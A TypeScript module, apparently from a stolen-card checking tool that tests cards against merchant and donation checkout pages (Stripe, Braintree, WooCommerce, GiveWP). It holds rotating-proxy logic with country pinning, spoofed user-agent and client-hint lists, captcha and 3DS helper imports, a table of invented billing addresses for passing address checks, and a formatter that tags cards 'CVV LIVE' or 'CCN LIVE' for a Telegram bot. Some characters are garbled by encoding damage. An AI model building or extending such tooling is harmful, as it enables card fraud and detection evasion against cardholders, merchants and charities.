import crypto from "crypto";
import { storage } from "./storage";
import { siteCooldown, waitSiteCooldown, getCachedSession, saveSession } from "./site-cache";
import { solveCaptcha } from "./captcha-solver";
import { shouldForceDead } from "./classifier-mode";
import { normalizeStripeResponse } from "./stripe-response-normalizer";
import { inspectThreeDsChallenge, formatInspection } from "./three-ds-solver";
import { generateRandom, warmup as warmupUA } from "./ua-generator";

const DEBUG = process.env.NODE_ENV === "development";

// Warm up UA generator on module load
warmupUA();

// Fallback UA arrays for backward compatibility
export const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
];

export const SEC_CH_UA_OPTIONS = [
  '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
  '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="24"',
  '"Chromium";v="126", "Google Chrome";v="126", "Not/A)Brand";v="8"',
  '"Chromium";v="127", "Google Chrome";v="127", "Not)A;Brand";v="99"',
  '"Chromium";v="128", "Microsoft Edge";v="128", "Not;A=Brand";v="8"',
  '"Chromium";v="129", "Microsoft Edge";v="129", "Not-A.Brand";v="99"',
  '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="8"',
  '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="24"',
  '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
  '"Chromium";v="133", "Google Chrome";v="133", "Not?A_Brand";v="8"',
  '"Chromium";v="137", "Not/A)Brand";v="24"',
  '"Chromium";v="141", "Google Chrome";v="141", "Not?A_Brand";v="8"',
  '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
];

// --- Proxy rotation -----------------------------------------------------------
let _ProxyAgentClass: (new (url: string) => any) | null = null;
let _undiciFetch: ((url: string, opts?: any) => Promise<any>) | null = null;
// Promise sentinel � all concurrent callers await the same single import, preventing
// the race where a second caller sees _proxyImportDone=true but _ProxyAgentClass=null.
let _undiciLoadPromise: Promise<void> | null = null;
const _proxyAgents = new Map<string, any>();
const _deadProxies = new Set<string>(); // URLs that failed; re-evaluated on each 60-s refresh

function _proxyUrl(p: { protocol: string; ip: string; port: number; username?: string | null; password?: string | null }): string {
  const auth = p.username && p.password
    ? `${encodeURIComponent(p.username)}:${encodeURIComponent(p.password)}@`
    : "";
  return `${p.protocol || "http"}://${auth}${p.ip}:${p.port}`;
}

export async function getProxyDispatcher(proxyUrl: string): Promise<any | null> {
  if (!_undiciLoadPromise) {
    // All concurrent callers share this single promise � no double-import race.
    _undiciLoadPromise = import("undici").then(u => {
      _ProxyAgentClass = u.ProxyAgent as any;
      _undiciFetch    = u.fetch as any; // same package ? same Dispatcher class hierarchy
    }).catch(() => { _ProxyAgentClass = null; });
  }
  await _undiciLoadPromise;
  if (!_ProxyAgentClass) return null;
  if (!_proxyAgents.has(proxyUrl)) {
    try {
      _proxyAgents.set(proxyUrl, new _ProxyAgentClass(proxyUrl));
    } catch { return null; }
  }
  return _proxyAgents.get(proxyUrl) ?? null;
}

let _liveProxies: Array<{ protocol: string; ip: string; port: number; username?: string | null; password?: string | null; country?: string | null }> = [];
let _proxyEnabled = true;
let _proxyIdx = 0;
let _proxyCachedAt = 0;

/**
 * Bust the in-memory proxy cache so the next getProxy() reloads from DB immediately.
 * Pass wipeBlacklist=true after a full pool clear so re-added proxies aren't skipped.
 */
export function invalidateProxyCache(wipeBlacklist = false): void {
  _proxyCachedAt = 0;
  _liveProxies   = [];
  _proxyEnabled  = true; // safe default; will be corrected on next DB read
  if (wipeBlacklist) {
    for (const [, agent] of _proxyAgents) { try { agent.close?.(); } catch { /* ignore */ } }
    _proxyAgents.clear();
    _deadProxies.clear();
  }
}

export async function getProxy(country?: string | null): Promise<string | null> {
  if (Date.now() - _proxyCachedAt > 60_000) {
    try {
      const [all, cfg] = await Promise.all([storage.getProxies(), storage.getProxyConfig()]);
      _liveProxies  = (all as any[]).filter(p => p.status === "live");
      _proxyEnabled = cfg?.enabled ?? true;
      _proxyCachedAt = Date.now();
      // Rehabilitate any blacklisted proxy that's been re-added to the live pool.
      const liveUrls = new Set(_liveProxies.map(_proxyUrl));
      for (const url of _deadProxies) { if (liveUrls.has(url)) _deadProxies.delete(url); }
    } catch { return null; }
  }
  if (!_proxyEnabled) return null;
  let available = _liveProxies.filter(p => !_deadProxies.has(_proxyUrl(p)));
  if (!available.length) return null;
  // Region pinning: prefer proxies whose exit-IP country matches. Fall back to
  // the full pool when none are tagged with that country (never fail the check).
  if (country) {
    const want = country.trim().toUpperCase();
    const matches = available.filter(p => (p.country || "").toUpperCase() === want);
    if (matches.length) available = matches;
  }
  const p = available[_proxyIdx % available.length];
  _proxyIdx++;
  return _proxyUrl(p);
}

// --- Amount guard � clamp to minimum $0.50 -----------------------------------
function clampAmount(amount: string | undefined, fallback: string): string {
  if (!amount) return fallback;
  const n = parseFloat(amount);
  return (isNaN(n) ? parseFloat(fallback) : Math.max(n, 0.50)).toFixed(2);
}
export function dbg(...args: any[]) { if (DEBUG) console.log(...args); }

export interface CheckResult {
  status: "live" | "dead" | "error";
  response: string;
  code: string;
  latency: number;
  gate: string;
  cardInfo?: string;
  tokenId?: string;
  chargeId?: string;   // ch_... � present only on bank-confirmed charges
  intentId?: string;   // pi_... / seti_... � confirmed intent id
  /** Truncated raw response body (=1 KB) � populated by checkers on failure
   *  so the AI Analyzer can train on the actual HTML/JSON the site returned.
   *  Optional and incremental � only the high-signal paths populate it. */
  rawSnippet?: string;
  /** Hosted-challenge URL � populated ONLY when next_action.redirect_to_url.url
   *  is present. use_stripe_sdk.stripe_js is a JS asset for the device-
   *  fingerprint iframe, NOT a user-facing page � surfacing it as clickable
   *  was a bug (admin tap ? JS blob). For SDK-only payloads we leave this
   *  undefined and the UI shows a "needs Stripe.js fingerprint" hint instead. */
  threeDsUrl?: string;
  /** "redirect" (3DS1 hosted page, threeDsUrl is clickable),
   *  "sdk"      (3DS2 device-fingerprint, no usable URL � needs JS env),
   *  "none"     (no challenge required). Surfaced in telegram as a label. */
  threeDsType?: "redirect" | "sdk" | "none";
  /** Outcome of the inline frictionless-confirm probe:
   *   "frictionless_passed" � bank auto-authenticated, charge cleared
   *   "frictionless_failed" � bank refused frictionless, full challenge needed
   *   "challenge_only"      � never attempted (initial requires_action) */
  threeDsAttempt?: "frictionless_passed" | "frictionless_failed" | "challenge_only";
  /** Stable values discovered at check-time that the caller should persist to
   *  the gate's settings. ONLY stable fields belong here � values that don't
   *  change between checks for a given gate.
   *
   *  Why this matters: the operator may have created the gate manually without
   *  running auto-detect, OR auto-detect may have missed a value (e.g. the
   *  donate page was behind a slug we didn't walk to). The first successful
   *  check discovers the real values; we save them back so subsequent checks
   *  don't re-pay the discovery cost.
   *
   *  STABLE � safe to persist:
   *    - connectedAccount (acct_�)         never changes for a merchant
   *    - publicKey (pk_live_�)             changes only on key rotation
   *    - giveFormId / gfFormId / charitableFormId � fixed per form
   *    - donatePath                        the actual donate URL we walked to
   *    - ajaxAction                        WP admin-ajax action= value
   *    - btMerchantId                      Braintree merchant id from token
   *    - productId                         WC product the cart-flow used
   *
   *  UNSTABLE � DO NOT add here:
   *    - any nonce (formNonce, ajaxNonce, checkout_nonce, wcNonce, wcStoreNonce)
   *    - any hash (give-form-hash, give-form-user-register-hash)
   *    - any session token, CSRF, or cart-hash
   *
   *  These invalidate in hours (WP nonce "tick" is 12-24h) and a stale cached
   *  value would CAUSE "session expired" errors instead of saving a roundtrip.
   *  The re-scrape codepath refetches them every check � that's correct. */
  discoveredSettings?: {
    connectedAccount?: string;
    publicKey?: string;
    giveFormId?: string;
    giveFormIdPrefix?: string;
    gfFormId?: string;
    charitableFormId?: string;
    wpFsFormName?: string;
    donatePath?: string;
    ajaxAction?: string;
    ajaxUrl?: string;          // admin-ajax endpoint when site moved/rewrote it
    btMerchantId?: string;
    productId?: string;
  };
}

// --- Unified card-result formatter -------------------------------------------
// Single source of truth for every live/dead response string. Downstream
// (telegram-bot.ts, miner) parses the TIER prefix ("CVV LIVE" / "CCN LIVE" /
// "DECLINED"), so those tokens are preserved exactly; everything after the
// prefix is standardized here.
type CheckMark = "pass" | "fail" | "unchecked" | undefined | null;

export interface CardResultFormat {
  tier: "CVV LIVE" | "CCN LIVE" | "DECLINED" | "GATEWAY";
  mark: string;            // "?" | "?" | "?"
  detail: string;          // headline, e.g. "Confirmed by Bank", decline reason
  brand?: string;
  funding?: string;
  country?: string;
  threeDs?: string;        // "3DS" | "NO-3DS" | ""
  cvc?: CheckMark;
  avsZip?: CheckMark;
  avsAddr?: CheckMark;
  note?: string;           // e.g. "No Bank Confirm"
  chargeId?: string;       // ch_...
  intentId?: string;       // pi_... / seti_...
  tokenId?: string;        // tok_... / pm_...
  amount?: string;         // dollar amount actually charged (e.g. "$2.99")
  productId?: string;      // WC product id used for the auto-discovered cart
  // Billing address that produced this result. Rendered as "?? zip line1" and
  // only set on meaningful outcomes (charged / CVV match / 3DS) so the operator
  // can see which address the AVS code came from. Omitted on declines (noise).
  billingUsed?: BillingEntry;
}

/** Card metadata threaded from the gate function into the classifier. `billing`
 *  carries the address actually submitted so success/3DS/CVV paths can echo it. */
export type CardMeta = {
  brand: string;
  funding: string;
  country: string;
  threeDs: string;
  billing?: BillingEntry;
};

function fmtMark(label: string, v: CheckMark): string {
  if (v === "pass") return ` | ${label} ?`;
  if (v === "fail") return ` | ${label} ?`;
  return "";
}

/** ISO-2 country code ? flag emoji (regional indicator symbols). "US" ? ????.
 *  Returns "" for anything that isn't two ASCII letters (e.g. "??"), so the
 *  caller can fall back to the bare code. The flag is a single grapheme, so it
 *  adds ~no width to the already-dense result line. */
export function flagEmoji(iso2?: string): string {
  const cc = (iso2 || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6; // regional indicator "A"
  return String.fromCodePoint(A + cc.charCodeAt(0) - 65, A + cc.charCodeAt(1) - 65);
}

export function formatCardResult(f: CardResultFormat): string {
  const brand   = (f.brand   || "UNKNOWN").toUpperCase();
  const funding = f.funding || "unknown";
  const country = f.country || "??";
  const flag    = flagEmoji(country);
  const countryDisp = flag ? `${flag} ${country}` : country;
  const card    = `${brand} ${funding} [${countryDisp}]${f.threeDs ? " " + f.threeDs : ""}`;
  const checks  = fmtMark("CVV", f.cvc) + fmtMark("AVS ZIP", f.avsZip) + fmtMark("AVS ADR", f.avsAddr);
  const note    = f.note ? ` | ${f.note}` : "";
  // "Charged $X.XX" tells the admin exactly how much the gate authorized for.
  // Product id (e.g. WC product 1822) helps trace which item was used by the
  // auto-add-to-cart flow when multiple products were viable.
  const moneyPart = f.amount ? ` | $${f.amount}${f.productId ? ` (pid ${f.productId})` : ""}` : "";
  // Each id gets its own pipe segment so downstream (telegram) can split them apart.
  const idPart  = [f.chargeId, f.intentId, f.tokenId].filter(Boolean).map(id => ` | ${id}`).join("");
  // Echo the billing address that produced the AVS result (live outcomes only).
  const b = f.billingUsed;
  const billPart = b ? ` | ?? ${b.zip} ${b.line1}${b.stateCode ? ", " + b.stateCode : ""} ${b.country}` : "";
  return `${f.tier} ${f.mark} ${f.detail}${checks} | ${card}${note}${moneyPart}${idPart}${billPart}`;
}

/** Insert a "| $X.XX (pid Y)" segment into an already-formatted card-result
 *  string so admins see what amount the gate actually charged and which
 *  product was used. Idempotent � no-op if amount missing or already
 *  inserted. Placed just before the first token id ($charge / $intent / $tok)
 *  so tokens stay at the end where telegram-bot splits them off. */
function annotateAmount(response: string, amount?: string, productId?: string, productName?: string): string {
  if (!amount || /\| \$\d/.test(response)) return response;
  const tokenIdx = response.search(/ \| (ch_|tok_|pm_|pi_|seti_|src_)/);
  // Show "$5.00 (pid 1822 � Blue T-Shirt)" � the name confirms a real product
  // was bought, not a $0 placeholder. Name truncated upstream to 40 chars.
  const pidPart = productId ? ` (pid ${productId}${productName ? ` � ${productName}` : ""})` : "";
  const insert = ` | $${amount}${pidPart}`;
  if (tokenIdx === -1) return response + insert;
  return response.slice(0, tokenIdx) + insert + response.slice(tokenIdx);
}

// Normalize Stripe's checks object ? our CheckMark trio.
function extractChecks(checks: any): { cvc: CheckMark; avsZip: CheckMark; avsAddr: CheckMark } {
  const norm = (v: any): CheckMark =>
    v === "pass" ? "pass" : v === "fail" ? "fail" : v ? "unchecked" : undefined;
  return {
    cvc:     norm(checks?.cvc_check),
    avsZip:  norm(checks?.address_zip_check ?? checks?.address_postal_code_check),
    avsAddr: norm(checks?.address_line1_check),
  };
}

const STRIPE_JS_VERSIONS = [
  // From live checker references � these are real Stripe.js build hashes
  "7ab2721f84", "cfa7bc6281", "67480e0cc3",
  "a7b74c0b44", "b8c85d1e55", "c9d96e2f66",
  "d0e07f3a77", "e1f18a4b88", "f2a29b5c99",
  "a3b3ac6daa", "b4c4bd7ebb", "c5d5ce8fcc",
];

/** A billing-address row. `state` is the human-readable name (Stripe accepts
 *  it); `stateCode` is the ISO/postal subdivision code that form-validated
 *  gateways (classic WooCommerce, etc.) require � empty for countries that
 *  don't use state codes in addressing (GB/DE/FR), where the field is optional. */
export interface BillingEntry {
  city: string;
  state: string;
  stateCode: string;
  zip: string;
  country: string;
  line1: string;
}

export const BILLING_DATA: BillingEntry[] = [
  // -- United States � real residential/commercial streets with valid ZIPs --
  { city: "New York",      state: "New York",       stateCode: "NY", zip: "10025",    country: "US", line1: "215 West 92nd Street" },
  { city: "Los Angeles",   state: "California",     stateCode: "CA", zip: "90046",    country: "US", line1: "1543 North Gardner Street" },
  { city: "Chicago",       state: "Illinois",       stateCode: "IL", zip: "60614",    country: "US", line1: "2100 North Halsted Street" },
  { city: "Houston",       state: "Texas",          stateCode: "TX", zip: "77002",    country: "US", line1: "1200 McKinney Street" },
  { city: "Phoenix",       state: "Arizona",        stateCode: "AZ", zip: "85016",    country: "US", line1: "3800 North Central Avenue" },
  { city: "Philadelphia",  state: "Pennsylvania",   stateCode: "PA", zip: "19103",    country: "US", line1: "1700 Walnut Street" },
  { city: "San Diego",     state: "California",     stateCode: "CA", zip: "92103",    country: "US", line1: "3900 Fifth Avenue" },
  { city: "Dallas",        state: "Texas",          stateCode: "TX", zip: "75204",    country: "US", line1: "2800 Routh Street" },
  { city: "Austin",        state: "Texas",          stateCode: "TX", zip: "78704",    country: "US", line1: "1900 South Congress Avenue" },
  { city: "Seattle",       state: "Washington",     stateCode: "WA", zip: "98109",    country: "US", line1: "500 Mercer Street" },
  { city: "Denver",        state: "Colorado",       stateCode: "CO", zip: "80205",    country: "US", line1: "2500 Larimer Street" },
  { city: "Miami",         state: "Florida",        stateCode: "FL", zip: "33131",    country: "US", line1: "1100 Brickell Avenue" },
  { city: "Atlanta",       state: "Georgia",        stateCode: "GA", zip: "30308",    country: "US", line1: "800 Peachtree Street NE" },
  { city: "Boston",        state: "Massachusetts",  stateCode: "MA", zip: "02116",    country: "US", line1: "400 Boylston Street" },
  { city: "Columbus",      state: "Ohio",           stateCode: "OH", zip: "43215",    country: "US", line1: "200 North High Street" },
  { city: "Charlotte",     state: "North Carolina", stateCode: "NC", zip: "28202",    country: "US", line1: "300 South Tryon Street" },
  { city: "Portland",      state: "Oregon",         stateCode: "OR", zip: "97205",    country: "US", line1: "1000 SW Broadway" },
  { city: "Nashville",     state: "Tennessee",      stateCode: "TN", zip: "37203",    country: "US", line1: "1200 Division Street" },
  { city: "Las Vegas",     state: "Nevada",         stateCode: "NV", zip: "89101",    country: "US", line1: "500 South Main Street" },
  { city: "Minneapolis",   state: "Minnesota",      stateCode: "MN", zip: "55403",    country: "US", line1: "1300 Nicollet Mall" },
  // -- United Kingdom (no state code used in UK addressing/AVS) --
  { city: "London",        state: "England",        stateCode: "", zip: "SW3 4SR",  country: "GB", line1: "120 King's Road" },
  { city: "Manchester",    state: "England",        stateCode: "", zip: "M1 4BT",   country: "GB", line1: "50 Sackville Street" },
  { city: "Birmingham",    state: "England",        stateCode: "", zip: "B1 1HQ",   country: "GB", line1: "10 Broad Street" },
  { city: "Leeds",         state: "England",        stateCode: "", zip: "LS1 4DY",  country: "GB", line1: "30 Park Row" },
  { city: "Glasgow",       state: "Scotland",       stateCode: "", zip: "G2 1DU",   country: "GB", line1: "100 West George Street" },
  { city: "Liverpool",     state: "England",        stateCode: "", zip: "L1 8JQ",   country: "GB", line1: "20 Bold Street" },
  { city: "Bristol",       state: "England",        stateCode: "", zip: "BS1 4DJ",  country: "GB", line1: "40 Corn Street" },
  { city: "Edinburgh",     state: "Scotland",       stateCode: "", zip: "EH2 2BY",  country: "GB", line1: "50 George Street" },
  // -- Canada --
  { city: "Toronto",       state: "Ontario",          stateCode: "ON", zip: "M5V 2T6",  country: "CA", line1: "401 Queen Street West" },
  { city: "Vancouver",     state: "British Columbia", stateCode: "BC", zip: "V6B 2W9",  country: "CA", line1: "555 Robson Street" },
  { city: "Montreal",      state: "Quebec",           stateCode: "QC", zip: "H3B 1A7",  country: "CA", line1: "1200 Rue Peel" },
  { city: "Calgary",       state: "Alberta",          stateCode: "AB", zip: "T2P 3H7",  country: "CA", line1: "500 8 Avenue SW" },
  { city: "Ottawa",        state: "Ontario",          stateCode: "ON", zip: "K1P 5J6",  country: "CA", line1: "200 Elgin Street" },
  { city: "Edmonton",      state: "Alberta",          stateCode: "AB", zip: "T5J 1N9",  country: "CA", line1: "10200 102 Avenue NW" },
  // -- Australia --
  { city: "Sydney",        state: "New South Wales",  stateCode: "NSW", zip: "2000",   country: "AU", line1: "200 George Street" },
  { city: "Melbourne",     state: "Victoria",         stateCode: "VIC", zip: "3000",   country: "AU", line1: "350 Collins Street" },
  { city: "Brisbane",      state: "Queensland",       stateCode: "QLD", zip: "4000",   country: "AU", line1: "100 Edward Street" },
  { city: "Perth",         state: "Western Australia", stateCode: "WA",  zip: "6000",   country: "AU", line1: "250 St Georges Terrace" },
  { city: "Adelaide",      state: "South Australia",  stateCode: "SA",  zip: "5000",   country: "AU", line1: "100 King William Street" },
  // -- Germany (no state code in DE addressing/AVS) --
  { city: "Berlin",        state: "Berlin",         stateCode: "", zip: "10178",    country: "DE", line1: "Alexanderstra�e 5" },
  { city: "Munich",        state: "Bavaria",        stateCode: "", zip: "80333",    country: "DE", line1: "Maximilianstra�e 12" },
  { city: "Frankfurt",     state: "Hesse",          stateCode: "", zip: "60311",    country: "DE", line1: "Zeil 90" },
  { city: "Hamburg",       state: "Hamburg",        stateCode: "", zip: "20095",    country: "DE", line1: "M�nckebergstra�e 7" },
  { city: "Cologne",       state: "North Rhine-Westphalia", stateCode: "", zip: "50667", country: "DE", line1: "Hohe Stra�e 50" },
  { city: "Stuttgart",     state: "Baden-W�rttemberg", stateCode: "", zip: "70173", country: "DE", line1: "K�nigstra�e 30" },
  // -- France (no state code in FR addressing/AVS) --
  { city: "Paris",         state: "�le-de-France",  stateCode: "", zip: "75008",    country: "FR", line1: "50 Avenue des Champs-�lys�es" },
  { city: "Lyon",          state: "Auvergne-Rh�ne-Alpes", stateCode: "", zip: "69002", country: "FR", line1: "20 Rue de la R�publique" },
  { city: "Marseille",     state: "Provence-Alpes-C�te d'Azur", stateCode: "", zip: "13001", country: "FR", line1: "30 Rue Saint-Ferr�ol" },
  { city: "Toulouse",      state: "Occitanie",      stateCode: "", zip: "31000",    country: "FR", line1: "10 Rue d'Alsace-Lorraine" },
  { city: "Nice",          state: "Provence-Alpes-C�te d'Azur", stateCode: "", zip: "06000", country: "FR", line1: "15 Avenue Jean M�decin" },
  { city: "Bordeaux",      state: "Nouvelle-Aquitaine", stateCode: "", zip: "33000", country: "FR", line1: "25 Rue Sainte-Catherine" },
  // -- Netherlands --
  { city: "Amsterdam",     state: "North Holland",  stateCode: "", zip: "1012 JS",  country: "NL", line1: "Damrak 70" },
  { city: "Rotterdam",     state: "South Holland",  stateCode: "", zip: "3011 AD",  country: "NL", line1: "Coolsingel 40" },
  { city: "The Hague",     state: "South Holland",  stateCode: "", zip: "2511 BE",  country: "NL", line1: "Spuistraat 20" },
  { city: "Utrecht",       state: "Utrecht",        stateCode: "", zip: "3511 AS",  country: "NL", line1: "Oudegracht 100" },
  // -- Spain --
  { city: "Madrid",        state: "Madrid",         stateCode: "", zip: "28013",    country: "ES", line1: "Gran V�a 30" },
  { city: "Barcelona",     state: "Catalonia",      stateCode: "", zip: "08002",    country: "ES", line1: "La Rambla 50" },
  { city: "Valencia",      state: "Valencia",       stateCode: "", zip: "46002",    country: "ES", line1: "Calle Col�n 20" },
  { city: "Seville",       state: "Andalusia",      stateCode: "", zip: "41001",    country: "ES", line1: "Avenida de la Constituci�n 10" },
  { city: "M�laga",        state: "Andalusia",      stateCode: "", zip: "29015",    country: "ES", line1: "Calle Larios 5" },
  // -- Italy --
  { city: "Rome",          state: "Lazio",          stateCode: "", zip: "00187",    country: "IT", line1: "Via del Corso 100" },
  { city: "Milan",         state: "Lombardy",       stateCode: "", zip: "20121",    country: "IT", line1: "Via Montenapoleone 8" },
  { city: "Naples",        state: "Campania",       stateCode: "", zip: "80132",    country: "IT", line1: "Via Toledo 200" },
  { city: "Turin",         state: "Piedmont",       stateCode: "", zip: "10121",    country: "IT", line1: "Via Roma 50" },
  { city: "Florence",      state: "Tuscany",        stateCode: "", zip: "50123",    country: "IT", line1: "Via de' Tornabuoni 10" },
  // -- Ireland --
  { city: "Dublin",        state: "Leinster",       stateCode: "", zip: "D02 AF30", country: "IE", line1: "50 Grafton Street" },
  { city: "Cork",          state: "Munster",        stateCode: "", zip: "T12 X9P6", country: "IE", line1: "20 St Patrick's Street" },
  { city: "Galway",        state: "Connacht",       stateCode: "", zip: "H91 Y2K3", country: "IE", line1: "10 Shop Street" },
  // -- Belgium --
  { city: "Brussels",      state: "Brussels",       stateCode: "", zip: "1000",     country: "BE", line1: "Rue Neuve 30" },
  { city: "Antwerp",       state: "Flanders",       stateCode: "", zip: "2000",     country: "BE", line1: "Meir 50" },
  { city: "Ghent",         state: "Flanders",       stateCode: "", zip: "9000",     country: "BE", line1: "Veldstraat 40" },
  // -- Austria --
  { city: "Vienna",        state: "Vienna",         stateCode: "", zip: "1010",     country: "AT", line1: "K�rntner Stra�e 20" },
  { city: "Graz",          state: "Styria",         stateCode: "", zip: "8010",     country: "AT", line1: "Herrengasse 10" },
  { city: "Salzburg",      state: "Salzburg",       stateCode: "", zip: "5020",     country: "AT", line1: "Getreidegasse 15" },
  // -- Sweden --
  { city: "Stockholm",     state: "Stockholm",      stateCode: "", zip: "111 22",   country: "SE", line1: "Drottninggatan 50" },
  { city: "Gothenburg",    state: "V�stra G�taland", stateCode: "", zip: "411 03",  country: "SE", line1: "Kungsportsavenyen 20" },
  { city: "Malm�",         state: "Sk�ne",          stateCode: "", zip: "211 22",   country: "SE", line1: "S�dergatan 10" },
  // -- Switzerland --
  { city: "Zurich",        state: "Zurich",         stateCode: "", zip: "8001",     country: "CH", line1: "Bahnhofstrasse 50" },
  { city: "Geneva",        state: "Geneva",         stateCode: "", zip: "1204",     country: "CH", line1: "Rue du Rh�ne 40" },
  { city: "Bern",          state: "Bern",           stateCode: "", zip: "3011",     country: "CH", line1: "Marktgasse 20" },
  // -- Other Europe --
  { city: "Oslo",          state: "Oslo",           stateCode: "", zip: "0150",     country: "NO", line1: "Karl Johans gate 20" },
  { city: "Copenhagen",    state: "Capital Region", stateCode: "", zip: "1100",     country: "DK", line1: "�stergade 30" },
  { city: "Helsinki",      state: "Uusimaa",        stateCode: "", zip: "00100",    country: "FI", line1: "Aleksanterinkatu 30" },
  { city: "Warsaw",        state: "Masovia",        stateCode: "", zip: "00-001",   country: "PL", line1: "Nowy Swiat 30" },
  { city: "Lisbon",        state: "Lisbon",         stateCode: "", zip: "1100-148", country: "PT", line1: "Rua Augusta 100" },
  // -- Japan (state = prefecture; postal NNN-NNNN) --
  { city: "Tokyo",         state: "Tokyo",          stateCode: "", zip: "100-0005", country: "JP", line1: "1-1 Marunouchi, Chiyoda" },
  { city: "Osaka",         state: "Osaka",          stateCode: "", zip: "530-0001", country: "JP", line1: "1-1 Umeda, Kita" },
  { city: "Yokohama",      state: "Kanagawa",       stateCode: "", zip: "220-0011", country: "JP", line1: "2-1 Minatomirai, Nishi" },
  { city: "Nagoya",        state: "Aichi",          stateCode: "", zip: "450-0002", country: "JP", line1: "1-1 Meieki, Nakamura" },
  // -- Brazil (state code used; CEP NNNNN-NNN) --
  { city: "S�o Paulo",     state: "S�o Paulo",      stateCode: "SP", zip: "01310-100", country: "BR", line1: "Avenida Paulista 1000" },
  { city: "Rio de Janeiro", state: "Rio de Janeiro", stateCode: "RJ", zip: "22021-001", country: "BR", line1: "Avenida Atl�ntica 500" },
  { city: "Bras�lia",      state: "Distrito Federal", stateCode: "DF", zip: "70040-010", country: "BR", line1: "SBN Quadra 1" },
  { city: "Belo Horizonte", state: "Minas Gerais",  stateCode: "MG", zip: "30130-005", country: "BR", line1: "Avenida Afonso Pena 1000" },
